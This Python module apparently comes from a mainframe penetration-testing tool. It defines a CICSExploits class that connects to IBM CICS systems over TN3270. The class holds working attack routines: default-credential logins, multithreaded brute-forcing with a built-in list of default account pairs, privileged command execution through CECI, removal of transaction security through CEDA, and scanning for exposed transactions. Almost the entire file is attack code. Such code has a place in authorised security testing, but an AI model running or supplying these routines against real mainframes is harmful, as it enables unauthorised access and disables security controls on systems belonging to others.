import logging
import time
from concurrent.futures import ThreadPoolExecutor

from tn3270_session import TN3270Session
from cics_utilities import decode_mainframe_output


class CICSExploits:
    """
    Handles exploitation techniques, including default credentials, transaction commands,
    brute-forcing, and security bypass attempts (CEDA-based example).
    """

    def __init__(self, host: str, port: int = 23, timeout: float = 10.0, applid: str = "CICS"):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.applid = applid
        self.session = TN3270Session(host, port, timeout)

    def open_cics_session(self) -> bool:
        """
        Opens a CICS session by sending "L <applid>".
        Returns True if successful or partially successful.
        """
        try:
            self.session.open_session()
            self.session.send_vtam_command(f"L {self.applid}")
            time.sleep(1.0)
            response = decode_mainframe_output(self.session.read_screen())
            logging.debug(f"CICS session opened, screen: {response}")
            return True
        except Exception as ex:
            logging.error(f"Error opening CICS session: {ex}")
        return False

    def close_cics_session(self) -> None:
        """
        Closes the TN3270 session.
        """
        self.session.close_session()

    def exploit_default_credentials(self, userid: str, password: str) -> bool:
        """
        Attempt a login using default or known credentials.
        """
        logging.info(f"Attempting default credentials: {userid}/{password}")
        success = False
        try:
            if not self.open_cics_session():
                return False

            # Send CESN to prompt for credentials
            self.session.send_vtam_command("CESN")
            time.sleep(1.0)

            # Send user credentials
            self.session.send_vtam_command(userid)
            time.sleep(0.5)
            self.session.send_vtam_command(password)
            time.sleep(1.0)

            response = decode_mainframe_output(self.session.read_screen())
            if "SIGN-ON COMPLETE" in response.upper() or "SUCCESSFUL" in response.upper():
                logging.info("Successfully exploited default credentials!")
                success = True
            else:
                logging.warning("Default credentials exploit failed.")
        except Exception as ex:
            logging.error(f"Error during default credentials exploit: {ex}")
        finally:
            self.close_cics_session()
        return success

    def brute_force_login(self, credentials_list=None, threads: int = 5) -> None:
        """
        Perform a *real* brute-force login attempt with multiple threads.
        """
        if credentials_list is None:
            credentials_list = [
                ("CICS", "CICS"),
                ("TEST", "TEST"),
                ("SYSADM", "SYSADM")
                # Add more as desired
            ]

        logging.info(f"Starting brute force attack with {threads} threads...")

        def worker_login(creds):
            user, pwd = creds
            logging.debug(f"[BRUTE] Trying {user}/{pwd}")
            return self.exploit_default_credentials(user, pwd)

        found_valid = False
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker_login, c) for c in credentials_list]
            for fut in futures:
                if fut.result():
                    found_valid = True

        if found_valid:
            logging.info("Brute force succeeded: at least one valid credential found.")
        else:
            logging.warning("Brute force failed: no valid credentials found.")

    def exploit_transaction_command(self, transaction: str, command: str) -> bool:
        """
        Attempt to run a potentially privileged transaction command.
        """
        logging.info(f"Attempting transaction exploit: {transaction} {command}")
        success = False
        try:
            if not self.open_cics_session():
                return False

            self.session.send_vtam_command(transaction)
            time.sleep(1.0)
            self.session.send_vtam_command(command)
            time.sleep(1.0)

            response = decode_mainframe_output(self.session.read_screen())
            logging.debug(f"Transaction exploit response: {response}")

            # Typical success indicators
            if "COMMAND EXECUTED" in response.upper() or "RESPONSE: NORMAL" in response.upper():
                logging.info(f"Transaction {transaction} command '{command}' succeeded.")
                success = True
            else:
                logging.warning("Transaction exploit may have failed or had no visible success marker.")
        except Exception as ex:
            logging.error(f"Error during transaction exploit: {ex}")
        finally:
            self.close_cics_session()

        return success

    def exploit_arbitrary_commands(self) -> bool:
        """
        Example method for sending arbitrary commands if the system is known to be vulnerable.
        """
        logging.info("Attempting arbitrary commands exploit.")
        success = False
        try:
            if not self.open_cics_session():
                return False

            self.session.send_vtam_command("CECI")
            time.sleep(1.0)
            # Hypothetical privileged command
            self.session.send_vtam_command("EX TRA('XYZ') WAIT")
            time.sleep(1.0)

            response = decode_mainframe_output(self.session.read_screen())
            logging.debug(f"[Arbitrary Commands] Response:\n{response}")

            if "AUTHORISED" in response.upper() or "EXECUTION SUCCESSFUL" in response.upper():
                logging.info("Arbitrary commands appear to be authorised!")
                success = True
            else:
                logging.warning("Arbitrary commands exploit not successful or not applicable.")
        except Exception as ex:
            logging.error(f"Error during arbitrary commands exploit: {ex}")
        finally:
            self.close_cics_session()
        return success

    def security_bypass_exploit(self) -> bool:
        """
        Bypass CICS security by abusing CEDA.
        This example tries to remove or weaken transaction security if misconfig allows it.

        Flow:
          1. Open session
          2. Issue 'CEDA' transaction
          3. Attempt to change or remove security requirements on a resource
          4. Check for success indicators
        """
        logging.info("Attempting security bypass exploit via CEDA.")
        success = False
        try:
            if not self.open_cics_session():
                return False

            # STEP 1: Launch the CEDA transaction
            self.session.send_vtam_command("CEDA")
            time.sleep(1.0)
            response = decode_mainframe_output(self.session.read_screen())
            logging.debug(f"[Bypass] After 'CEDA':\n{response}")

            # Check if we are unauthorized right away
            if "NOT AUTH" in response.upper():
                logging.warning("CEDA transaction requires authority. Bypass aborted.")
                return False
            if "DFHAC" in response.upper() and "SECURITY" in response.upper():
                logging.warning("CEDA responded with a security error. Bypass aborted.")
                return False

            # STEP 2: Example command that might remove or alter security
            # Real bypass logic depends on discovered vulnerabilities: 
            # e.g. "SET TRAN XXX SECURITY(NO)", "DEFINE TRAN HACK ...", etc.

            # We'll do an example "SET TRAN XYZ SECURITY(NO)" to illustrate
            bypass_cmd = "SET TRAN XYZ SECURITY(NO)"
            logging.info(f"[Bypass] Sending: {bypass_cmd}")
            self.session.send_vtam_command(bypass_cmd)
            time.sleep(1.0)

            response2 = decode_mainframe_output(self.session.read_screen())
            logging.debug(f"[Bypass] After 'SET TRAN':\n{response2}")

            # STEP 3: Check for success indicators 
            # e.g. "SUCCESSFUL", "CHANGED", "TASK COMPLETED", etc.
            possible_success_markers = ["CHANGED", "TASK COMPLETE", "RESP=0", "SUCCESS"]
            if any(marker in response2.upper() for marker in possible_success_markers):
                logging.info("Security bypass command completed successfully!")
                success = True
            else:
                logging.warning("CEDA command did not indicate success; check logs.")

        except Exception as ex:
            logging.error(f"Error during security bypass exploit: {ex}")
        finally:
            self.close_cics_session()

        return success

    def scan_for_cics_markers(self) -> dict:
        """
        Sends each known common transaction in turn, reads the screen,
        and notes any that appear to be active or respond meaningfully.
        """
        common_txns = ["CECI", "CESN", "CEDA", "CEMT", "CESF", "CEBR", "CECD", "CEGR", "CEMR"]
        logging.info("Scanning for common CICS transaction markers...")

        results = {}
        try:
            if not self.open_cics_session():
                return results

            for txn in common_txns:
                self.session.send_vtam_command(txn)
                time.sleep(1.0)
                response = decode_mainframe_output(self.session.read_screen())

                if "NOT AUTHORIZED" in response.upper():
                    results[txn] = "Transaction exists but access is denied."
                elif "DFHAC" in response.upper() or "DFH" in response.upper():
                    results[txn] = "Transaction responded with DFH message (likely valid)."
                elif "INVALID" in response.upper() or "NOT FOUND" in response.upper():
                    results[txn] = "Likely invalid or unknown transaction."
                else:
                    if txn in response.upper():
                        results[txn] = "Transaction label found, possibly active."
                    else:
                        results[txn] = "Unknown response or no clear marker."

                time.sleep(0.5)
        except Exception as ex:
            logging.error(f"Error scanning for CICS markers: {ex}")
        finally:
            self.close_cics_session()

        return results
